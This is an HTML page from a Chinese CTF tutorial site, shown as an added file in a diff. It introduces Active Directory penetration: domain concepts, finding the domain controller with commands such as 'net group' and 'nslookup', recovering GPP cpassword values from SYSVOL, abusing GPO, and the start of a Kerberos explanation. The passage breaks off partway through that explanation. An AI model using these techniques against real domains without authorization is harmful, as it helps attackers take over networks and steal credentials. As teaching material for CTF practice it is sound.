@@ -1,0 +1,1583 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>域渗透入门 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <div class="tn-group">文件与编码基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">隐写分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">取证分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <div class="tn-group">环境与工具</div>
+      
+  
+    
+      <a class="tn-link" href="../web_env/">Web环境设置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_install/">Docker安装配置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_env/">Docker与漏洞环境</a>
+    
+  
+    
+      <a class="tn-link" href="../vm_lab/">虚拟机与网络模拟</a>
+    
+  
+    
+      <a class="tn-link" href="../burp/">Burp Suite</a>
+    
+  
+    
+      <a class="tn-link" href="../py_script/">Python脚本</a>
+    
+  
+    
+      <a class="tn-link" href="../http/">HTTP协议</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <div class="tn-group">信息收集</div>
+      
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">PHP专题</div>
+      
+  
+    
+      <a class="tn-link" href="../php_features/">PHP特性与常见绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser/">PHP反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">注入类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../nosql/">NoSQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../csrf/">CSRF攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../ssrf/">SSRF注入</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">文件类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../any_file_read/">任意文件读取</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">命令与代码执行</div>
+      
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../session_jwt/">会话与认证安全</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <div class="tn-group">语言扩展 | 世界不止有PHP</div>
+      
+  
+    
+      <a class="tn-link" href="../py_unser/">Python反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../py_sandbox/">Python沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../flask_sec/">Flask安全</a>
+    
+  
+    
+      <a class="tn-link" href="../prototype_pollution/">原型链污染</a>
+    
+  
+    
+      <a class="tn-link" href="../js_sandbox/">JS沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../js_reverse/">JS逆向</a>
+    
+  
+    
+      <a class="tn-link" href="../java_basic/">Java安全基础</a>
+    
+  
+    
+      <a class="tn-link" href="../java_unser/">Java反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../spring/">Spring漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../java_audit/">Java代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">进阶专题</div>
+      
+  
+    
+      <a class="tn-link" href="../waf_bypass/">WAF绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../http_smuggling/">请求走私</a>
+    
+  
+    
+      <a class="tn-link" href="../cache_poisoning/">缓存投毒</a>
+    
+  
+    
+      <a class="tn-link" href="../xs_leaks/">XS-Leaks</a>
+    
+  
+    
+      <a class="tn-link" href="../web_crypto/">密码学应用题</a>
+    
+  
+    
+      <a class="tn-link" href="../cloud_container/">云与容器安全</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">实战能力</div>
+      
+  
+    
+      <div class="tn-group">渗透链路基础</div>
+      
+  
+    
+      <a class="tn-link" href="../pentest_flow/">渗透流程总览</a>
+    
+  
+    
+      <a class="tn-link" href="../two_layer/">两层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../foothold/">立足点建立</a>
+    
+  
+    
+      <a class="tn-link" href="../internal_recon/">内网信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../proxy_tunnel/">代理与隧道</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">多层网络渗透</div>
+      
+  
+    
+      <a class="tn-link" href="../three_layer/">三层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../multi_layer/">多层网络综合</a>
+    
+  
+    
+      <a class="tn-link on" href="./">域渗透入门</a>
+    
+  
+    
+      <a class="tn-link" href="../lateral/">横向移动</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">对抗与综合</div>
+      
+  
+    
+      <a class="tn-link" href="../awd/">AWD模式</a>
+    
+  
+    
+      <a class="tn-link" href="../web_pwn/">Web与二进制结合</a>
+    
+  
+    
+      <a class="tn-link" href="../nday/">Nday利用</a>
+    
+  
+    
+      <a class="tn-link" href="../review/">Writeup复盘方法</a>
+    
+  
+
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/env/">环境配置</a>
+    
+  
+    
+      <div class="tn-group">基础知识</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">密码体系</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <div class="tn-group">环境与基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">栈溢出</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">ROP利用</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="_1">域渗透入门<a class="headerlink" href="#_1" title="Permanent link">¶</a></h1>
+<p>在内网渗透类的 CTF 赛题（尤其是大型攻防演练、AWD 后的内网环节、以及模拟企业环境的靶场）中，拿下边界 Web 服务器往往只是第一步——真正的目标藏在 Windows 域（Active Directory，简称 AD）里。本章讲清楚域渗透的基础概念和最经典的几个攻击手法，做到"够用即止"：看懂题目拓扑、会识别域环境、理解 Kerberos 认证、知道每个漏洞点该用什么工具打。</p>
+<p>域环境的基础是 Windows，建议读者先掌握本书「Web入门题单」中的基础命令，并对「敏感信息泄露」一章提到的凭据收集思路有所了解——很多域渗透的起点就是一个泄露的账号密码。</p>
+<h2 id="_2">工作组与域<a class="headerlink" href="#_2" title="Permanent link">¶</a></h2>
+<h3 id="workgroup">工作组（Workgroup）<a class="headerlink" href="#workgroup" title="Permanent link">¶</a></h3>
+<p>单机、家庭和小型局域网最常见的工作模式。每台机器各自维护自己的账号数据库（SAM），账号密码只在本机有效，<code>PC1</code> 上的账号 <code>admin</code> 在 <code>PC2</code> 上完全不存在。管理十台机器就要维护十套账号，机器一多就是灾难。</p>
+<h3 id="domain">域（Domain）<a class="headerlink" href="#domain" title="Permanent link">¶</a></h3>
+<p>域是微软给出的集中式管理方案：把一堆 Windows 机器纳入一个"组织"，由一台专门的机器——<strong>域控（Domain Controller, DC）</strong>——统一存储和管理所有账号。核心区别在于：</p>
+<ul>
+<li>账号存在 DC 的 NTDS.dit 数据库里，而不是各台机器本地；</li>
+<li>域内任何一台机器都可以用域账号登录，权限由 DC 说了算；</li>
+<li>管理员可以在 DC 上一条策略下发到全域所有机器。</li>
+</ul>
+<p>一句话：工作组是"各管各的"，域是"一个老板管所有人"。对攻击者来说，这意味着 <strong>拿下域控 ≈ 拿下整个域</strong>——所有域账号的哈希都在域控上，这既是防守方的命根子，也是进攻方的终点。</p>
+<h2 id="_3">域核心概念<a class="headerlink" href="#_3" title="Permanent link">¶</a></h2>
+<h3 id="dc">域控（DC）与域名<a class="headerlink" href="#dc" title="Permanent link">¶</a></h3>
+<p>域用域名标识，形如 <code>hack.lab</code>、<code>corp.com</code>。域内主机名通常是 <code>机器名.域名</code>，例如 <code>DC01.hack.lab</code>。域控是一台安装了 AD DS（Active Directory Domain Services）角色的 Windows Server，存储着全域的账号数据库 <code>NTDS.dit</code>，同时通常兼任域的 DNS 服务器——这是一个非常重要的识别特征。</p>
+<h3 id="_4">域用户与域组<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
+<p>域用户身份一般写成 <code>域名\用户名</code>（如 <code>HACK\alice</code>）或 UPN 格式 <code>alice@hack.lab</code>。</p>
+<p>记住几个关键域组就够了：</p>
+<ul>
+<li><code>Domain Admins</code>（域管理员）：域内最高权限，攻击的最终目标；</li>
+<li><code>Enterprise Admins</code>：跨整个林（多个域组成的集合）的最高权限；</li>
+<li><code>Domain Users</code>：所有域用户默认都在里面；</li>
+<li><code>Domain Computers</code>：每台加入域的机器自动有一个机器账号，名字带 <code>$</code> 后缀（如 <code>WEB01$</code>）。机器账号也是账号，同样有密码（每 30 天自动更换），同样可以用于认证——很多攻击手法（如约束委派利用、Silver Ticket）都要用到它。</li>
+</ul>
+<h3 id="gpo">组策略（GPO）<a class="headerlink" href="#gpo" title="Permanent link">¶</a></h3>
+<p>组策略（Group Policy Object）是域管理员批量下发配置的手段：桌面壁纸、软件安装、账号权限、脚本……全都可以通过 GPO 推送到全域机器。GPO 存在域控的共享目录 <code>\\DC\SYSVOL</code> 里。</p>
+<p>对渗透的意义有两点：</p>
+<ol>
+<li>SYSVOL 里的 XML 配置文件历史上存在过泄露加密密码的问题（<code>cpassword</code>，AES 密钥被微软自己公开了），用 <code>Get-GPPPassword</code> 之类的工具就能解出本地管理员密码；</li>
+<li>拿到高权限后可以篡改 GPO，给全域机器下发恶意脚本，实现批量控制。</li>
+</ol>
+<h2 id="_5">域环境识别与域控定位<a class="headerlink" href="#_5" title="Permanent link">¶</a></h2>
+<p>进入一台内网机器后，第一件事是搞清楚：这是不是域内的机器？域控在哪？</p>
+<h3 id="_6">判断是否加入域<a class="headerlink" href="#_6" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># 查看系统信息，重点看 "Domain" 一行</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>systeminfo
+</code></pre></div>
+<p>输出中 <code>Domain: hack.lab</code> 表示已加域；如果是 <code>WORKGROUP</code> 就是工作组机器。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c"># PowerShell 判断（返回 True 即已加域）</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="p">(</span><span class="nb">Get-WmiObject</span> <span class="n">Win32_ComputerSystem</span><span class="p">).</span><span class="n">PartOfDomain</span>
+</code></pre></div>
+<h3 id="_7">定位域控<a class="headerlink" href="#_7" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># 最直接的一条：查询当前域的域控列表</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>net<span class="w"> </span>group<span class="w"> </span><span class="s2">"Domain Controllers"</span><span class="w"> </span>/domain
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># 查看本机登录服务器（往往就是域控）</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nb">set</span><span class="w"> </span>logonserver
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nb">echo</span><span class="w"> </span>%LOGONSERVER%
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># 通过时间服务确认——域内机器默认与域控同步时间</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>net<span class="w"> </span><span class="nb">time</span><span class="w"> </span>/domain
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># 域名解析：域控通常兼任 DNS，看 DNS 指向谁</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>nslookup<span class="w"> </span>hack.lab
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>ipconfig<span class="w"> </span>/all
+</code></pre></div>
+<p>域控的典型特征（内网扫描时的识别依据）：</p>
+<ul>
+<li>开放 389/636（LDAP）、88（Kerberos）、53（DNS）、445（SMB）、135（RPC）、3268（GC）端口；</li>
+<li>主机名常带 <code>DC</code>、<code>AD</code> 字样；</li>
+<li>作为 DNS 服务器被全域机器指向。</li>
+</ul>
+<p>在 CTF 题目里，拓扑往往已经画出域控位置，但上述命令在"盲打"环节能帮你快速确认。</p>
+<h2 id="kerberos">Kerberos 认证流程入门<a class="headerlink" href="#kerberos" title="Permanent link">¶</a></h2>
+<p>域内的身份认证协议是 Kerberos（端口 88），它是后续 PTT（Pass The Ticket）、Kerberoasting 等一切票据攻击的基础，必须理解。</p>
+<h3 id="_8">三个角色<a class="headerlink" href="#_8" title="Permanent link">¶</a></h3>
+<ul>
+<li><strong>客户端（Client）</strong>：想访问服务的用户/机器；</li>
+<li><strong>KDC（Key Distribution Center）</strong>：密钥分发中心，就运行在域控上，内部又分为两个服务：</li>
+<li><strong>AS（Authentication Service）</strong>：负责"验明正身"，发 TGT；</li>
+<li><strong>TGS（Ticket Granting Service）</strong>：负责"发票"，发服务票据；</li>
+<li><strong>服务端（Server）</strong>：提供具体服务（文件共享、SQL Server、HTTP 等）的机器。</li>
+</ul>
+<h3 id="_9">认证流程（图解式描述）<a class="headerlink" href="#_9" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>  Client                      DC (KDC)                    Server
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>    |                           |                           |
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    |-- (1) AS-REQ -----------&gt; |                           |
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    |   "我是 alice，请给我门票"  |                           |
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    |                           |                           |
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>    | &lt;- (2) AS-REP ----------  |                           |
